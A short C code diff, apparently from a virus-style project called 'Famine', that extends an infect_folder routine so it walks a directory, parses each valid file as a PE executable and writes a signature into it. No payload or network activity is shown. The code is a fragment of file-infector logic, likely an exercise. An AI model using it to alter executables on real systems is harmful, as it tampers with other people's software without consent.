@@ -41,7 +41,6 @@ static bool			check_file_validity(t_famine *famine, char *target_path, char *fil
 	if (!(file_stat = check_access_file(file_path, famine)))
 		return (false);
 	free(file_stat);
-	// TODO Check PE validity
 	return (true);
 }
 
@@ -53,14 +52,17 @@ void				infect_folder(t_famine *famine, char *folder_name)
 	char			*target_path	= get_complete_path(famine, folder_name);
 	DIR				*directory		= NULL;
 	struct dirent	*file			= NULL;
+	t_pe			*pe_file		= NULL;
 
 	if (!(directory = opendir(target_path))) {
-		print_message(famine, strerror(errno));
+		print_message(famine, strerror(errno), true);
 		return;
 	}
 	while ((file = readdir(directory)) != NULL) {
 		if (check_file_validity(famine, target_path, file->d_name)) {
-			printf("OK for file %s", file->d_name);
+			if ((pe_file = pe(famine, target_path, file->d_name)) != NULL) {
+				printf("Set signature in PE file named %s\n", pe_file->name);
+			}
 		}
 	}
 }
